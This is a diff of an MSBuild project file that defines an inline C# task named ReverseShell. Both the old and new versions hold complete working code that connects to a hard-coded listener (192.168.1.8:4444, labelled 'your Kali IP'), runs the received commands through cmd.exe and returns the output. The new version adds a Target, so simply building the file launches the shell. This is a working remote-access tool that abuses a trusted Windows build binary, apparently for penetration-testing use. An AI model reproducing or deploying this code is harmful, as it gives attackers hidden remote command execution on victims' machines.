@@ -1,114 +1,121 @@
-<UsingTask TaskName="ReverseShell" TaskFactory="CodeTaskFactory" 
-           AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
-  <Task>
-    <Code Type="Class" Language="cs"><![CDATA[
-    using System;
-    using System.Net.Sockets;
-    using System.Diagnostics;
-    using System.Text;
-    using System.IO;
-    using System.Threading;
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="Connect">
+    <ReverseShell />
+  </Target>
 
-    public class ReverseShell : Microsoft.Build.Utilities.Task {
-        public override bool Execute() {
-            // Run shell in the same thread so MSBuild waits for it to finish
-            try {
-                StartShell();
-            } catch (Exception ex) {
-                // Log to temp so you can inspect exceptions (avoid silent fail)
-                try {
-                    File.AppendAllText(Path.Combine(Path.GetTempPath(), "msbuild_revshell.log"),
-                        DateTime.UtcNow.ToString("o") + " Execute exception: " + ex.ToString() + Environment.NewLine);
-                } catch {}
-            }
-            return true;
+  <UsingTask TaskName="ReverseShell" TaskFactory="CodeTaskFactory"
+             AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+    <Task>
+      <Code Type="Class" Language="cs"><![CDATA[
+using System;
+using System.Net.Sockets;
+using System.Diagnostics;
+using System.Text;
+using System.IO;
+using System.Threading;
+
+public class ReverseShell : Microsoft.Build.Utilities.Task {
+    public override bool Execute() {
+        try {
+            // Run in the same thread so MSBuild waits until this returns
+            StartShell();
+        } catch (Exception ex) {
+            SafeLog("Execute exception: " + ex.ToString());
         }
+        return true;
+    }
 
-        private void StartShell() {
-            string host = "192.168.1.8";  // Your Kali IP
-            int port = 4444;
+    private void StartShell() {
+        string host = "192.168.1.8"; // <--- set your Kali IP
+        int port = 4444;             // <--- set your listener port
 
-            try {
-                using(TcpClient client = new TcpClient()) {
-                    client.Connect(host, port);
-                    using(NetworkStream stream = client.GetStream()) {
-                        stream.ReadTimeout = 1000; // optional
-                        stream.WriteTimeout = 1000;
+        try {
+            using (TcpClient client = new TcpClient()) {
+                // Try to connect (blocking)
+                client.Connect(host, port);
+                using (NetworkStream stream = client.GetStream()) {
+                    stream.ReadTimeout = 0;  // 0 = infinite
+                    stream.WriteTimeout = 0;
 
-                        // Send welcome message
-                        string welcome = "=== MSBuild Reverse Shell Connected ===\r\n";
-                        byte[] welcomeBytes = Encoding.UTF8.GetBytes(welcome);
-                        stream.Write(welcomeBytes, 0, welcomeBytes.Length);
-                        stream.Flush();
+                    // Welcome
+                    WriteToStream(stream, "=== MSBuild Reverse Shell Connected ===\r\n");
 
-                        while(client.Connected) {
-                            // Prompt
-                            string prompt = "PS " + Directory.GetCurrentDirectory() + "> ";
-                            byte[] promptBytes = Encoding.UTF8.GetBytes(prompt);
-                            stream.Write(promptBytes, 0, promptBytes.Length);
-                            stream.Flush();
+                    while (client.Connected) {
+                        // Prompt
+                        string prompt = "PS " + Directory.GetCurrentDirectory() + "> ";
+                        WriteToStream(stream, prompt);
 
-                            // Read command
-                            var buffer = new byte[4096];
-                            int bytesRead = 0;
-                            try {
-                                // Blocking read until data arrives
-                                bytesRead = stream.Read(buffer, 0, buffer.Length);
-                            } catch (IOException) {
-                                // read timeout or disconnect - loop to check connection
-                                Thread.Sleep(100);
-                                continue;
-                            }
-
-                            if(bytesRead <= 0) break;
-
-                            string command = Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim();
-                            if(command.Length == 0) continue;
-                            if(command == "exit") break;
-
-                            // Execute and return output
-                            string result = ExecuteCommand(command);
-                            byte[] outputBytes = Encoding.UTF8.GetBytes(result);
-                            stream.Write(outputBytes, 0, outputBytes.Length);
-                            stream.Flush();
+                        // Read command (blocking)
+                        byte[] buffer = new byte[8192];
+                        int bytesRead = 0;
+                        try {
+                            bytesRead = stream.Read(buffer, 0, buffer.Length);
+                        } catch (IOException) {
+                            // network error/read timeout - try again
+                            Thread.Sleep(100);
+                            continue;
                         }
+
+                        if (bytesRead <= 0) break;
+
+                        string command = Encoding.UTF8.GetString(buffer, 0, bytesRead).TrimEnd('\0', '\r', '\n');
+                        if (string.IsNullOrWhiteSpace(command)) continue;
+                        if (command.Equals("exit", StringComparison.OrdinalIgnoreCase)) break;
+
+                        string result = ExecuteCommand(command);
+                        WriteToStream(stream, result);
                     }
                 }
-            } catch (Exception ex) {
-                // write exception to a temp file for debugging
-                try {
-                    File.AppendAllText(Path.Combine(Path.GetTempPath(), "msbuild_revshell.log"),
-                        DateTime.UtcNow.ToString("o") + " StartShell exception: " + ex.ToString() + Environment.NewLine);
-                } catch {}
             }
-        }
-
-        private string ExecuteCommand(string command) {
-            try {
-                using(Process process = new Process()) {
-                    process.StartInfo.FileName = "cmd.exe";
-                    process.StartInfo.Arguments = "/c " + command;
-                    process.StartInfo.RedirectStandardOutput = true;
-                    process.StartInfo.RedirectStandardError = true;
-                    process.StartInfo.UseShellExecute = false;
-                    process.StartInfo.CreateNoWindow = true;
-                    process.Start();
-
-                    string output = process.StandardOutput.ReadToEnd();
-                    string error = process.StandardError.ReadToEnd();
-                    process.WaitForExit();
-
-                    if(!string.IsNullOrEmpty(error)) {
-                        output += "\r\n" + error;
-                    }
-
-                    return output + "\r\n";
-                }
-            } catch(Exception ex) {
-                return "Error: " + ex.Message + "\r\n";
-            }
+        } catch (Exception ex) {
+            SafeLog("StartShell exception: " + ex.ToString());
         }
     }
-    ]]></Code>
-  </Task>
-</UsingTask>
+
+    private void WriteToStream(NetworkStream stream, string text) {
+        try {
+            byte[] bytes = Encoding.UTF8.GetBytes(text);
+            stream.Write(bytes, 0, bytes.Length);
+            stream.Flush();
+        } catch (Exception ex) {
+            SafeLog("WriteToStream exception: " + ex.ToString());
+        }
+    }
+
+    private string ExecuteCommand(string command) {
+        try {
+            using (Process process = new Process()) {
+                process.StartInfo.FileName = "cmd.exe";
+                process.StartInfo.Arguments = "/c " + command;
+                process.StartInfo.RedirectStandardOutput = true;
+                process.StartInfo.RedirectStandardError = true;
+                process.StartInfo.UseShellExecute = false;
+                process.StartInfo.CreateNoWindow = true;
+                process.Start();
+
+                string output = process.StandardOutput.ReadToEnd();
+                string error = process.StandardError.ReadToEnd();
+                process.WaitForExit();
+
+                if (!string.IsNullOrEmpty(error)) {
+                    output += Environment.NewLine + error;
+                }
+
+                return output + "\r\n";
+            }
+        } catch (Exception ex) {
+            return "ExecuteCommand error: " + ex.Message + "\r\n";
+        }
+    }
+
+    private void SafeLog(string text) {
+        try {
+            string path = Path.Combine(Path.GetTempPath(), "msbuild_revshell.log");
+            File.AppendAllText(path, DateTime.UtcNow.ToString("o") + " " + text + Environment.NewLine);
+        } catch { /* best-effort logging only */ }
+    }
+}
+      ]]></Code>
+    </Task>
+  </UsingTask>
+</Project>
